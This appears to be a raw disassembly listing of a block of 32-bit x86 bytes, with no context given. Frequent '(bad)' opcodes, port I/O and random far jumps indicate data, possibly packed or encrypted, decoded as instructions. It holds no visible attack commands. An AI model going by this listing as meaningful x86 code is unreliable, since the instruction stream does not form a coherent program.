  408400:	jl     0x40847d
  408402:	(bad)  
  408403:	(bad)  
  408404:	xacquire xchg DWORD PTR [edx+esi*1+0x3e],edi
  408409:	scas   eax,DWORD PTR es:[edi]
  40840a:	rol    DWORD PTR [ebx],0x9a
  40840d:	pushf  
  40840e:	sbb    DWORD PTR [ebp-0x270682ee],0xcf7b0774
  408418:	sbb    ebp,DWORD PTR [eax+eiz*2]
  40841b:	jl     0x40849a
  40841d:	fnstenv [ecx]
  40841f:	mov    ds:0x258e693b,al
  408424:	lahf   
  408425:	mov    dh,0xf5
  408427:	dec    esp
  408428:	xchg   ax,ax
  40842a:	pop    ecx
  40842b:	stos   BYTE PTR es:[edi],al
  40842c:	adc    DWORD PTR [ecx-0x1c],esp
  40842f:	test   DWORD PTR [eax+edx*1],ecx
  408432:	or     edx,edi
  408434:	push   ss
  408435:	mov    ebp,0x716d7286
  40843a:	mov    eax,ds:0x6f646641
  40843f:	xchg   ebp,ecx
  408441:	dec    ebx
  408442:	outs   dx,BYTE PTR ds:[esi]
  408443:	and    DWORD PTR [ebp+0xf],esi
  408446:	inc    edx
  408447:	cmp    DWORD PTR [edx],ebx
  408449:	and    ebx,esi
  40844b:	push   es
  40844c:	jmp    0x9888:0x1a05258c
  408453:	sub    eax,0x74597093
  408458:	inc    eax
  408459:	dec    eax
  40845a:	sub    DWORD PTR [edx+eax*8+0x41619e73],edx
  408461:	and    ebx,DWORD PTR [ebp-0x197f444a]
  408467:	mov    WORD PTR [ebp+0x4e2ef697],gs
  40846d:	sti    
  40846e:	not    DWORD PTR [edx]
  408470:	push   0x16bd2ccb
  408475:	sahf   
  408476:	stos   BYTE PTR es:[edi],al
  408477:	pop    eax
  408478:	out    0xc5,al
  40847a:	xor    DWORD PTR [ebp-0xd],0xffffff95
  40847e:	mov    ecx,0x732f0ecf
  408483:	pusha  
  408484:	adc    edi,esi
  408486:	enter  0xa9bb,0x99
  40848a:	fdivr  DWORD PTR [ebp+0x3e]
  40848d:	cmc    
  40848e:	dec    esi
  40848f:	adc    eax,0xe182d484
  408494:	imul   ebp,ecx,0xb6165fb
  40849a:	adc    ah,dl
  40849c:	(bad)  
  40849d:	xchg   edi,eax
  40849e:	pushf  
  40849f:	test   eax,0xdd84433
  4084a4:	gs call 0xb0c3da8
  4084aa:	mov    ah,0x67
  4084ac:	(bad)  
  4084ad:	out    dx,eax
  4084ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084af:	sbb    eax,0x2eba8550
  4084b4:	in     al,0x4
  4084b6:	and    al,0xdb
  4084b8:	mov    al,0x85
  4084ba:	sub    DWORD PTR [ecx-0x5],ebx
  4084bd:	jae    0x408471
  4084bf:	fwait
  4084c0:	stc    
  4084c1:	ror    BYTE PTR [edx-0x1],0x57
  4084c5:	js     0x4084a7
  4084c7:	out    0xd6,eax
  4084c9:	adc    ecx,DWORD PTR [ecx+0x26352902]
  4084cf:	fwait
  4084d0:	loop   0x40845f
  4084d2:	daa    
  4084d3:	clc    
  4084d4:	out    dx,eax
  4084d5:	jmp    0xc5d75df8
  4084da:	lea    ebx,[ebp+0x489654f1]
  4084e0:	jne    0x408518
  4084e2:	(bad)
  4084e5:	js     0x408542
  4084e7:	jo     0x408554
  4084e9:	dec    ebx
  4084ea:	dec    esi
  4084eb:	push   esp
  4084ec:	add    ah,al
  4084ee:	das    
  4084ef:	stos   BYTE PTR es:[edi],al
  4084f0:	mov    ds:0x53d4bbe2,eax
  4084f5:	mov    eax,ds:0xed30f37f
  4084fa:	or     al,0xec
  4084fc:	or     BYTE PTR [ebx+eax*2+0x1ef3bca6],ah
  408503:	sar    BYTE PTR [ebx-0x5d],1
  408506:	in     eax,dx
  408507:	push   esi
  408508:	mov    cl,0x3f
  40850a:	test   DWORD PTR [ecx-0x53a4d54f],0x1a54fdf8
  408514:	test   DWORD PTR [esi],edi
  408516:	shl    bh,cl
  408518:	inc    esi
  408519:	or     eax,0x987e4403
  40851e:	lds    ebp,FWORD PTR [esi]
  408520:	call   0x2a84:0xc94a2305
  408527:	js     0x40857a
  408529:	push   0xffffffbe
  40852b:	push   cs
  40852c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40852d:	xlat   BYTE PTR ds:[ebx]
  40852e:	lock imul edx,DWORD PTR [eax+0x20ae149],0xdf94b0bc
  408539:	pop    ds
  40853a:	in     eax,dx
  40853b:	or     BYTE PTR [ecx],0xa9
  40853e:	jge    0x40851d
  408540:	push   edi
  408541:	and    DWORD PTR [ecx+ebx*2-0x6f3aeee2],esp
  408548:	lahf   
  408549:	adc    bx,WORD PTR [ebx]
  40854c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40854d:	call   0x27a21036
  408552:	mov    bl,0xf6
  408554:	cmp    eax,0x1502a0ac
  408559:	ja     0x408519
  40855b:	adc    al,0xa1
  40855d:	mov    eax,0x2f09af48
  408562:	dec    edx
  408563:	mov    dl,0xa4
  408565:	xchg   esp,eax
  408566:	fld    TBYTE PTR [edx+0x3]
  408569:	mov    ebx,0x1b6c0a9a
  40856e:	stos   DWORD PTR es:[edi],eax
  40856f:	pop    edi
  408570:	fadd   DWORD PTR [esi]
  408572:	into   
  408573:	ficom  DWORD PTR [ebx+0x6d1721e2]
  408579:	mov    al,ds:0xe3ff9ade
  40857e:	jns    0x4085f9
  408580:	ins    BYTE PTR es:[edi],dx
  408581:	ds ins DWORD PTR es:[edi],dx
  408583:	fcmovnbe st,st(5)
  408585:	fbld   TBYTE PTR ds:0xf44df34b
  40858b:	jg     0x408570
  40858d:	ficom  WORD PTR [esi-0xecb5a5f]
  408593:	lods   al,BYTE PTR ds:[esi]
  408594:	lods   al,BYTE PTR ds:[esi]
  408595:	in     al,dx
  408596:	dec    ebx
  408597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408598:	cmp    DWORD PTR [esi+0x32a1a2d5],ebp
  40859e:	mov    edx,0xdce306b8
  4085a3:	test   eax,0x2f7aac26
  4085a8:	inc    ebp
  4085a9:	pop    esp
  4085aa:	fadd   QWORD PTR [edi-0x17]
  4085ad:	dec    DWORD PTR [esi-0x7896652]
  4085b3:	sbb    dh,dh
  4085b5:	adc    ecx,DWORD PTR [edx-0x12c214c]
  4085bb:	mov    edx,0xe166da06
  4085c0:	lock and eax,ebp
  4085c3:	sub    al,0x40
  4085c5:	pop    esp
  4085c6:	test   eax,0x74e69694
  4085cb:	adc    BYTE PTR [ebx],0x96
  4085ce:	(bad)  
  4085cf:	mov    ds:0xd83ce633,al
  4085d4:	shl    esi,1
  4085d6:	and    al,0x89
  4085d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085d9:	mov    dh,0x7b
  4085db:	jae    0x40856d
  4085dd:	sub    dh,BYTE PTR [edi]
  4085df:	push   0x58
  4085e1:	or     cl,0xbc
  4085e4:	addr16 xor cl,dh
  4085e7:	mov    ah,0x2e
  4085e9:	adc    ebx,DWORD PTR [edx]
  4085eb:	push   cs
  4085ec:	mov    al,ds:0x2be6d38d
  4085f1:	push   edi
  4085f2:	pop    esi
  4085f3:	sub    BYTE PTR [ebp+0x34f8fe91],0x99
  4085fa:	je     0x40861d
  4085fc:	push   0xffffff91
  4085fe:	dec    esi
  4085ff:	rcl    DWORD PTR [ecx+0x44401f79],1
  408605:	addr16 mov ebp,0x70a77a47
  40860b:	cmp    al,0xaf
  40860d:	mov    dh,0xf0
  40860f:	imul   ebp,DWORD PTR [ecx+eiz*1],0xfffffff4
  408613:	jmp    0xd664:0xd9ef3789
  40861a:	int    0x78
  40861c:	add    edx,DWORD PTR [ebx+ebx*1-0x5c]
  408620:	loop   0x408658
  408622:	and    BYTE PTR [edx],bl
  408624:	call   FWORD PTR [esi-0x28c0fd49]
  40862a:	cwde   
  40862b:	mov    esp,0xcfc5d1b2
  408630:	mov    ch,0x21
  408632:	sbb    BYTE PTR [esi+0x333a3569],cl
  408638:	mov    ecx,0x38bbcad1
  40863d:	jo     0x40862f
  40863f:	mov    dh,0xb5
  408641:	pop    ss
  408642:	mov    ebx,0x56e1f275
  408647:	ins    BYTE PTR es:[edi],dx
  408648:	cli    
  408649:	es jb  0x4085cf
  40864c:	dec    edx
  40864d:	out    dx,eax
  40864e:	into   
  40864f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408651:	mov    edx,ebp
  408653:	mov    edx,0x235a1830
  408658:	and    ecx,edi
  40865a:	(bad)  
  40865b:	mov    bh,0xda
  40865d:	ret    0xd2f6
  408660:	xchg   ecx,eax
  408661:	std    
  408662:	out    dx,eax
  408663:	add    DWORD PTR [ebx],ebx
  408665:	int    0x26
  408667:	(bad)  
  408668:	int3   
  408669:	imul   ebp,DWORD PTR [edi+0x7],0xffffffac
  40866d:	sub    al,0x87
  40866f:	sub    eax,0x7e426ed9
  408674:	cmp    BYTE PTR [edx],dl
  408676:	cmp    BYTE PTR [eax+0x5b],0x29
  40867a:	inc    ecx
  40867b:	out    dx,eax
  40867c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867d:	(bad)  
  40867e:	fbstp  TBYTE PTR [ebx-0x9]
  408681:	sti    
  408682:	hlt    
  408683:	push   esp
  408684:	fild   QWORD PTR ds:[esi]
  408687:	jmp    0x408632
  408689:	sahf   
  40868a:	test   BYTE PTR [ebx+edi*2],cl
  40868d:	imul   esi,edi,0x5f
  408690:	outs   dx,BYTE PTR ds:[esi]
  408691:	test   eax,0xac18504
  408696:	jne    0x40861e
  408698:	add    eax,ecx
  40869a:	or     BYTE PTR [esi],cl
  40869c:	enter  0x6252,0x60
  4086a0:	add    edi,DWORD PTR [edx]
  4086a2:	inc    eax
  4086a3:	push   edi
  4086a4:	mov    esp,0x3ceb0f05
  4086a9:	adc    ecx,0x2f
  4086ac:	mov    esi,0xea9a5d54
  4086b1:	sbb    esi,esp
  4086b3:	cmp    al,0x5e
  4086b5:	ror    DWORD PTR [edx],0x9e
  4086b8:	jns    0x408677
  4086ba:	lds    eax,FWORD PTR [edi+0xa5d111a]
  4086c0:	ins    DWORD PTR es:[edi],dx
  4086c1:	int    0x56
  4086c3:	and    DWORD PTR [edi],eax
  4086c5:	push   edx
  4086c6:	es retf 0xe702
  4086ca:	fcmovb st,st(2)
  4086cc:	push   cs
  4086cd:	mov    ecx,0x43e3b955
  4086d2:	and    ebx,DWORD PTR [ecx-0x5354bee9]
  4086d8:	fwait
  4086d9:	mov    WORD PTR [eax*8+0x3a3e44c],?
  4086e0:	js     0x40875f
  4086e2:	fild   DWORD PTR [edx]
  4086e4:	or     esp,DWORD PTR ds:[esi+0x507af355]
  4086eb:	daa    
  4086ec:	ins    DWORD PTR es:[edi],dx
  4086ed:	pop    esp
  4086ee:	mov    edx,0xfe8179f4
  4086f3:	outs   dx,DWORD PTR ds:[esi]
  4086f4:	das    
  4086f5:	push   ss
  4086f6:	jmp    0x408768
  4086f8:	sub    esi,DWORD PTR [esi+ecx*8]
  4086fb:	mov    edi,DWORD PTR ds:0x3a82f31d
  408701:	(bad)  
  408702:	and    bh,BYTE PTR [ebx+0x705b9e91]
  408708:	mov    eax,ds:0x723d9725
  40870d:	mov    ch,0xce
  40870f:	pop    edx
  408710:	dec    ebx
  408711:	into   
  408712:	pop    edi
  408713:	adc    eax,0xa772ff52
  408718:	sbb    eax,0x3a6f106e
  40871d:	inc    ecx
  40871e:	lods   al,BYTE PTR ds:[esi]
  40871f:	xchg   ecx,eax
  408720:	pop    es
  408721:	test   BYTE PTR [ebx+esi*4],cl
  408724:	fsub   DWORD PTR [edx+edi*8-0x1b]
  408728:	dec    eax
  408729:	and    esi,0xffffffd6
  40872c:	clc    
  40872d:	cdq    
  40872e:	mov    ecx,0xce32920
  408733:	mov    ds:0x42756a2f,eax
  408738:	popa   
  408739:	adc    eax,0x4dff9546
  40873e:	mov    ch,0x77
  408740:	push   ss
  408741:	imul   ebx,DWORD PTR [edi-0x4939465b],0x58
  408748:	fwait
  408749:	cmp    DWORD PTR [esi+ebx*4+0x26a84687],ebx
  408750:	sub    bl,BYTE PTR [edi]
  408752:	mov    bl,0x25
  408754:	ret    0x114c
  408757:	into   
  408758:	neg    DWORD PTR [eax+0x9]
  40875b:	push   ebx
  40875c:	jecxz  0x408749
  40875e:	jmp    0x40874e
  408760:	dec    edx
  408761:	mov    ds:0xc5dc64a6,eax
  408766:	sub    al,0x5e
  408768:	mov    bh,dl
  40876a:	test   bl,ch
  40876c:	repz pushf 
  40876e:	je     0x40878b
  408770:	xchg   edi,eax
  408771:	dec    ecx
  408772:	jmp    0x3621141
  408777:	xor    esp,DWORD PTR [edx+0x7e]
  40877a:	jecxz  0x4087f8
  40877c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40877d:	shl    BYTE PTR [edi-0x3dad219e],1
  408783:	push   ecx
  408784:	sub    BYTE PTR [eax+0x28],dl
  408787:	in     al,dx
  408788:	adc    al,BYTE PTR [ebx]
  40878a:	sub    al,0x2b
  40878c:	cmp    dh,BYTE PTR [edx]
  40878e:	int3   
  40878f:	jb     0x4087b9
  408791:	jle    0x40880e
  408793:	test   DWORD PTR [ebx+edi*8],esi
  408796:	or     ebx,eax
  408798:	or     ecx,esi
  40879a:	aaa    
  40879b:	or     eax,0x8bc6926e
  4087a0:	sub    edi,DWORD PTR [edi]
  4087a2:	and    DWORD PTR ds:0xeccb4b28,ebx
  4087a8:	aad    0x4
  4087aa:	cmp    esp,DWORD PTR [ecx]
  4087ac:	(bad)  
  4087ad:	xlat   BYTE PTR fs:[ebx]
  4087af:	sar    esp,cl
  4087b1:	xor    eax,0xd5993da6
  4087b6:	jb     0x4087d1
  4087b8:	repnz and BYTE PTR [ebx+0x49],ch
  4087bc:	jb     0x4087a7
  4087be:	mov    bh,0xa3
  4087c0:	mov    eax,0xeb441d4a
  4087c5:	popa   
  4087c6:	stos   BYTE PTR es:[edi],al
  4087c7:	outs   dx,BYTE PTR ds:[esi]
  4087c8:	cwde   
  4087c9:	in     al,dx
  4087ca:	pop    esp
  4087cb:	mov    ebx,0xdadd7374
  4087d0:	sub    esp,DWORD PTR [ebp+0x7c5ef3b3]
  4087d6:	test   al,0x9c
  4087d8:	ja     0x4087e9
  4087da:	rcl    DWORD PTR [esi-0x35ea8287],cl
  4087e0:	jl     0x40880f
  4087e2:	les    edx,FWORD PTR [ebp-0xcce7e97]
  4087e8:	inc    esi
  4087e9:	popa   
  4087ea:	xchg   ebp,eax
  4087eb:	ja     0x408784
  4087ed:	jp     0x408808
  4087ef:	popf   
  4087f0:	stos   BYTE PTR es:[edi],al
  4087f1:	cmp    dl,BYTE PTR [ebx]
  4087f3:	push   esi
  4087f4:	scas   al,BYTE PTR es:[edi]
  4087f5:	jmp    0x4087ac
  4087f7:	inc    esp
  4087f8:	jle    0x408844
  4087fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087fb:	ror    DWORD PTR [ecx],cl
  4087fd:	leave  
  4087fe:	and    al,0x65
  408800:	mov    BYTE PTR [esi+ebp*1-0x4792e847],ch
  408807:	mov    ebx,0xbf8d18cc
  40880c:	sbb    DWORD PTR [eax-0x6e49fdcc],esi
  408812:	aad    0x28
  408814:	call   0x5c9e:0x45afec11
  40881b:	inc    ebx
  40881c:	xchg   sp,ax
  40881e:	cmp    eax,DWORD PTR [eax-0x9]
  408821:	std    
  408822:	mov    ebp,0x1e95797f
  408827:	xchg   DWORD PTR [esi+0x3b],esi
  40882a:	stos   DWORD PTR es:[edi],eax
  40882b:	jp     0x408868
  40882d:	ins    BYTE PTR es:[edi],dx
  40882e:	div    BYTE PTR [edi+ebx*4-0x599f6310]
  408835:	adc    eax,0x8ddad20
  40883a:	retf   
  40883b:	leave  
  40883c:	inc    edx
  40883d:	adc    al,0x86
  40883f:	adc    eax,DWORD PTR [edx-0x31db504f]
  408845:	js     0x4088b2
  408847:	in     al,dx
  408848:	loope  0x4087d3
  40884a:	pop    edi
  40884b:	js     0x408806
  40884d:	enter  0xe942,0xa5
  408851:	push   es
  408852:	jge    0x4088ac
  408854:	mov    al,ds:0x33ab7f72
  408859:	jmp    DWORD PTR [edx-0x7c1a9c0b]
  40885f:	popa   
  408860:	sbb    al,0x57
  408862:	xchg   BYTE PTR [edi],ch
  408864:	fst    st(2)
  408866:	ds inc esp
  408868:	mov    eax,ds:0xb4daa8aa
  40886d:	into   
  40886e:	call   0x8338:0x556a742c
  408875:	fsubr  DWORD PTR [edx+0x31]
  408878:	mov    ds:0x427b7fda,eax
  40887d:	hlt    
  40887e:	cmc    
  40887f:	(bad)  [ecx+0x51]
  408882:	test   al,0x6f
  408884:	add    DWORD PTR [ecx+0x54f21b10],ebp
  40888a:	mov    ecx,0xe5ffb493
  40888f:	addr16 push ss
  408891:	fcmovnu st,st(6)
  408893:	popa   
  408894:	lahf   
  408895:	ja     0x408873
  408897:	daa    
  408898:	add    BYTE PTR [eax+0x46c0fcfc],al
  40889e:	inc    edx
  40889f:	rcl    DWORD PTR [ecx+0x12],0xc4
  4088a3:	push   cs
  4088a4:	pop    edx
  4088a5:	push   cs
  4088a6:	sub    eax,0xf763419f
  4088ab:	mov    ds:0x1fee03dd,eax
  4088b0:	fwait
  4088b1:	cmp    eax,0xd4b3bf11
  4088b6:	jno    0x408869
  4088b8:	lds    esp,FWORD PTR [eax+ecx*8-0xe72858d]
  4088bf:	cmp    bh,BYTE PTR [esi]
  4088c1:	mov    bh,0x2e
  4088c3:	sbb    ah,BYTE PTR [edi]
  4088c5:	sbb    bh,BYTE PTR [ebp-0x79]
  4088c8:	aaa    
  4088c9:	fwait
  4088ca:	test   DWORD PTR [edi],eax
  4088cc:	adc    eax,0x3e76a876
  4088d1:	fild   QWORD PTR [ecx-0x381002cb]
  4088d7:	xchg   ebp,ebx
  4088d9:	loopne 0x408875
  4088db:	lds    eax,FWORD PTR [esi-0x2fc03fc1]
  4088e1:	inc    edi
  4088e2:	stc    
  4088e3:	cmp    eax,0xaaa257ce
  4088e8:	and    BYTE PTR [ebx],cl
  4088ea:	jb     0x408877
  4088ec:	xchg   ecx,eax
  4088ed:	in     al,dx
  4088ee:	scas   eax,DWORD PTR es:[edi]
  4088ef:	mov    dh,0xbb
  4088f1:	in     eax,dx
  4088f2:	dec    esi
  4088f3:	sti    
  4088f4:	cmp    edx,DWORD PTR [esi+esi*1]
  4088f7:	ds mov esi,0x1c6b41b
  4088fd:	imul   ebx,DWORD PTR [esi+0x42ef373f],0xffffffc4
  408904:	hlt    
  408905:	rol    dl,0x9c
  408908:	adc    eax,0xa12fefe5
  40890d:	in     al,dx
  40890e:	sbb    edi,edx
  408910:	aad    0x6e
  408912:	jne    0x40892a
  408914:	and    DWORD PTR [ecx],ebx
  408916:	xchg   ebp,eax
  408917:	push   ebp
  408918:	add    edi,DWORD PTR [ebx+0x5f26dc25]
  40891e:	push   ecx
  40891f:	cmp    edi,esp
  408921:	sahf   
  408922:	test   BYTE PTR cs:[ecx-0x2a],cl
  408926:	test   al,0x84
  408928:	in     al,0x2c
  40892a:	ins    BYTE PTR es:[edi],dx
  40892b:	(bad)  
  40892d:	int    0x5b
  40892f:	stos   DWORD PTR es:[edi],eax
  408930:	sbb    edi,eax
  408932:	in     eax,0xad
  408934:	imul   ebp,DWORD PTR [edi+ecx*8],0xd3026294
  40893b:	addr16 ja 0x4088f6
  40893e:	add    BYTE PTR [ebx],dl
  408940:	or     BYTE PTR [edx],bl
  408942:	sbb    DWORD PTR [eax-0x17],0xd3d326c7
  408949:	add    al,0xf0
  40894b:	jnp    0x40893d
  40894d:	pop    ds
  40894e:	ss stc 
  408950:	xchg   edi,eax
  408951:	ret    
  408952:	(bad)  [edi]
  408954:	out    0x9a,al
  408956:	int3   
  408957:	mov    esi,0x94d6306
  40895c:	in     al,0xd1
  40895e:	mov    eax,edx
  408960:	mov    al,ds:0x89efbf17
  408965:	outs   dx,BYTE PTR ds:[esi]
  408966:	jmp    0xee50b960
  40896b:	(bad)  
  40896c:	(bad)
  40896f:	js     0x4089b0
  408971:	jae    0x408960
  408973:	in     eax,dx
  408974:	inc    ecx
  408975:	sbb    esp,DWORD PTR [ecx-0x5a88b811]
  40897b:	out    dx,al
  40897c:	(bad)  
  40897d:	jle    0x408938
  40897f:	xchg   esi,eax
  408980:	xlat   BYTE PTR ds:[ebx]
  408981:	mov    ds:0x497a7c53,al
  408986:	and    BYTE PTR [ebx+eax*8+0x724bfb0d],ch
  40898d:	ds mov edi,0xb46634fa
  408993:	(bad)  
  408994:	xor    BYTE PTR [ebx+0x78],dh
  408997:	push   cs
  408998:	ficomp WORD PTR [esi]
  40899a:	xor    al,0x5d
  40899c:	jecxz  0x408972
  40899e:	ins    BYTE PTR es:[edi],dx
  40899f:	pushf  
  4089a0:	dec    ecx
  4089a1:	loopne 0x40899f
  4089a3:	fstp   DWORD PTR [ebx-0x4f]
  4089a6:	mov    eax,esi
  4089a8:	cdq    
  4089a9:	jg     0x4089bc
  4089ab:	sbb    eax,0x8d5ceb76
  4089b0:	icebp  
  4089b1:	xor    al,0x2
  4089b3:	gs inc ebx
  4089b5:	fistp  DWORD PTR [edi+0x6e]
  4089b8:	loopne 0x4089a0
  4089ba:	ror    dl,cl
  4089bc:	fld    TBYTE PTR [ebx+0x115046e6]
  4089c2:	mov    bl,0x56
  4089c4:	mov    esp,0xe7a715ce
  4089c9:	jbe    0x4089f0
  4089cb:	lock jl 0x4089a0
  4089ce:	out    dx,eax
  4089cf:	mov    ch,0xf6
  4089d1:	xor    BYTE PTR [edi],ah
  4089d3:	or     eax,0x3bea45e
  4089d8:	lds    esp,FWORD PTR [edx]
  4089da:	jae    0x4089a0
  4089dc:	in     al,0xd5
  4089de:	lea    eax,[edi-0x68af5508]
  4089e4:	je     0x408971
  4089e6:	push   es
  4089e7:	sti    
  4089e8:	mov    ebp,0x8e020b8e
  4089ed:	std    
  4089ee:	inc    eax
  4089ef:	out    dx,eax
  4089f0:	leave  
  4089f1:	(bad)  
  4089f2:	mov    ds:0x37455a9c,al
  4089f7:	je     0x40899f
  4089f9:	pop    ecx
  4089fa:	int    0xde
  4089fc:	inc    edx
  4089fd:	cmp    eax,esi
  4089ff:	push   ebx
  408a00:	pop    es
  408a01:	shl    BYTE PTR [ebx+0x15ad10f1],cl
  408a07:	inc    edi
  408a08:	hlt    
  408a09:	shl    esi,0x10
  408a0c:	jmp    0x66410bee
  408a11:	outs   dx,BYTE PTR ds:[esi]
  408a12:	adc    BYTE PTR [eax+0x7d],al
  408a15:	rol    BYTE PTR [ebp+ebx*2+0x4b],cl
  408a19:	scas   al,BYTE PTR es:[edi]
  408a1a:	aam    0x9b
  408a1c:	jb     0x408a3f
  408a1e:	xchg   ebp,eax
  408a1f:	mov    edi,0xba71821
  408a24:	daa    
  408a25:	xor    eax,0x6746d0ed
  408a2a:	test   eax,0x3112ec71
  408a2f:	int3   
  408a30:	or     al,0x8
  408a32:	xor    eax,DWORD PTR [edi+ebp*1]
  408a35:	and    eax,0xf1994a2a
  408a3a:	js     0x408aaa
  408a3c:	inc    ecx
  408a3d:	pop    eax
  408a3e:	fmul   QWORD PTR [esi-0x77e5026a]
  408a44:	sub    esp,DWORD PTR [ebp+0x24]
  408a47:	aad    0x55
  408a49:	push   ebp
  408a4a:	jnp    0x408a96
  408a4c:	jno    0x408aa9
  408a4e:	ja     0x408a07
  408a50:	add    eax,0xa2ba9e41
  408a55:	push   edi
  408a56:	jo     0x408a21
  408a58:	dec    esi
  408a59:	ds mov dl,0x19
  408a5c:	add    ebp,DWORD PTR [eax*4-0x701e8b70]
  408a63:	arpl   WORD PTR [ebx],dx
  408a65:	shr    BYTE PTR [edi-0x75],1
  408a68:	outs   dx,BYTE PTR ds:[esi]
  408a69:	aas    
  408a6a:	cmp    al,0xc9
  408a6c:	retf   
  408a6d:	lds    edx,FWORD PTR gs:[esi]
  408a70:	mov    ebx,0xae3dda73
  408a75:	dec    esi
  408a76:	das    
  408a77:	cwde   
  408a78:	and    eax,0x5e2e039d
  408a7d:	and    al,0x36
  408a7f:	es dec ecx
  408a81:	push   ebp
  408a82:	bound  eax,QWORD PTR [edx+0x8]
  408a85:	in     al,dx
  408a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a87:	test   esp,ebp
  408a89:	push   edi
  408a8a:	fdivr  DWORD PTR [edx+0x36]
  408a8d:	sbb    BYTE PTR [esp+ebp*4],al
  408a90:	xchg   ecx,eax
  408a91:	adc    BYTE PTR [ebp-0x59],0x2e
  408a95:	lods   al,BYTE PTR ds:[esi]
  408a96:	mov    edx,edx
  408a98:	dec    eax
  408a99:	mov    cl,0x8a
  408a9b:	inc    eax
  408a9c:	pushf  
  408a9d:	jp     0x408a64
  408a9f:	fbld   TBYTE PTR [edi]
  408aa1:	dec    ebx
  408aa2:	inc    esp
  408aa3:	add    edi,DWORD PTR [ecx]
  408aa5:	cmp    al,BYTE PTR [edi]
  408aa7:	iret   
  408aa8:	into   
  408aa9:	scas   eax,DWORD PTR es:[edi]
  408aaa:	add    eax,0xffffffd9
  408aad:	sbb    al,0x5
  408aaf:	jbe    0x408b02
  408ab1:	loopne 0x408a95
  408ab3:	shl    BYTE PTR [esi-0x69],cl
  408ab6:	mov    esi,DWORD PTR [esi+esi*8-0x34]
  408aba:	loope  0x408b16
  408abc:	loope  0x408b2d
  408abe:	xchg   esi,eax
  408abf:	(bad)  
  408ac0:	xchg   esp,eax
  408ac1:	out    0x77,eax
  408ac3:	sub    ebx,esp
  408ac5:	cmp    DWORD PTR [ebp+0x55af913d],ebx
  408acb:	mov    ecx,0x91918eb6
  408ad0:	pushf  
  408ad1:	ja     0x408aaa
  408ad3:	dec    edx
  408ad4:	add    bh,BYTE PTR [eax-0x34]
  408ad7:	pop    ebp
  408ad8:	mov    ecx,DWORD PTR [edi]
  408ada:	test   eax,0x45d43b04
  408adf:	and    al,0x58
  408ae1:	sti    
  408ae2:	test   DWORD PTR ds:0xab67be4a,eax
  408ae8:	out    dx,eax
  408ae9:	mov    dl,0xe0
  408aeb:	ss hlt 
  408aed:	add    al,0xd0
  408aef:	into   
  408af0:	push   cs
  408af1:	cld    
  408af2:	pushf  
  408af3:	pop    edx
  408af4:	sbb    ebx,edi
  408af6:	cmp    DWORD PTR [esi],ebp
  408af8:	jb     0x408b24
  408afa:	pushf  
  408afb:	mov    al,0xa9
  408afd:	pop    esi
  408afe:	pop    ds
  408aff:	push   edx
  408b00:	sbb    DWORD PTR [ebp-0x1cbfb0d3],eax
  408b06:	xor    DWORD PTR [esi+0x3699ecdd],edx
  408b0c:	lods   al,BYTE PTR ds:[esi]
  408b0d:	jnp    0x408b6d
  408b0f:	xchg   esp,eax
  408b10:	adc    BYTE PTR [edi-0x77905048],0x47
  408b17:	gs inc esi
  408b19:	push   0x2b
  408b1b:	aaa    
  408b1c:	sub    eax,0x8b05171e
  408b21:	sbb    ebx,DWORD PTR [ecx]
  408b23:	test   ch,cl
  408b25:	in     eax,0xe5
  408b27:	fisub  DWORD PTR [esp+ebx*2-0x76]
  408b2b:	in     eax,dx
  408b2c:	test   al,0x16
  408b2e:	xor    ah,BYTE PTR [edi]
  408b30:	mov    dl,0x47
  408b32:	jo     0x408af9
  408b34:	shr    DWORD PTR [esi],1
  408b36:	outs   dx,BYTE PTR ds:[esi]
  408b37:	jg     0x408b39
  408b39:	sbb    al,ch
  408b3b:	pop    ecx
  408b3c:	add    DWORD PTR [edx+ebp*4],edx
  408b3f:	jb     0x408b65
  408b41:	rcl    BYTE PTR [edx-0x3053c0df],1
  408b47:	sbb    eax,0xcb8304f6
  408b4c:	add    DWORD PTR [ecx+0x477a7369],esp
  408b52:	push   esp
  408b53:	xor    DWORD PTR [eax],esi
  408b55:	adc    eax,0xf2e5f854
  408b5a:	fist   DWORD PTR [edi+0x7b]
  408b5d:	cmc    
  408b5e:	adc    DWORD PTR [esi-0x6b5f608f],0x6c6b5df7
  408b68:	test   BYTE PTR [edi],ah
  408b6a:	dec    esp
  408b6b:	xor    eax,0x5e495df9
  408b70:	cmp    ch,cl
  408b72:	test   eax,0x19f8dd7b
  408b77:	hlt    
  408b78:	pop    es
  408b79:	int3   
  408b7a:	sub    DWORD PTR [eax-0x2a],esp
  408b7d:	scas   al,BYTE PTR es:[edi]
  408b7e:	loope  0x408ba4
  408b80:	cld    
  408b81:	xchg   esi,eax
  408b82:	xchg   ebx,eax
  408b83:	fld    st(5)
  408b85:	les    eax,FWORD PTR [ebx]
  408b87:	adc    ch,BYTE PTR [ebx]
  408b89:	leave  
  408b8a:	cmp    ah,cl
  408b8c:	sbb    eax,0xb4176b29
  408b91:	jle    0x408c05
  408b93:	jg     0x408b4f
  408b95:	xchg   BYTE PTR [ebx+0x79],bl
  408b98:	jge    0x408c00
  408b9a:	adc    al,BYTE PTR [eax]
  408b9c:	xchg   ebp,eax
  408b9d:	sub    BYTE PTR [edi-0x31],bl
  408ba0:	xchg   BYTE PTR [edi+0x7a],dl
  408ba3:	dec    ecx
  408ba4:	jnp    0x408bf6
  408ba6:	add    BYTE PTR [edi-0x1f],0x5a
  408baa:	dec    esp
  408bab:	and    al,BYTE PTR [edi+0xa1734e8]
  408bb1:	sahf   
  408bb2:	sbb    DWORD PTR [ecx-0x50],ebp
  408bb5:	sbb    al,0xf2
  408bb7:	adc    ecx,ecx
  408bb9:	pop    ecx
  408bba:	dec    edx
  408bbb:	imul   edi,DWORD PTR [edi],0x9506ca4
  408bc1:	out    dx,al
  408bc2:	inc    ecx
  408bc3:	inc    edi
  408bc4:	add    al,BYTE PTR [edi+0xbf5677b]
  408bca:	mov    dh,BYTE PTR [edi+0x3a]
  408bcd:	and    dh,BYTE PTR ds:0x8d4fef3e
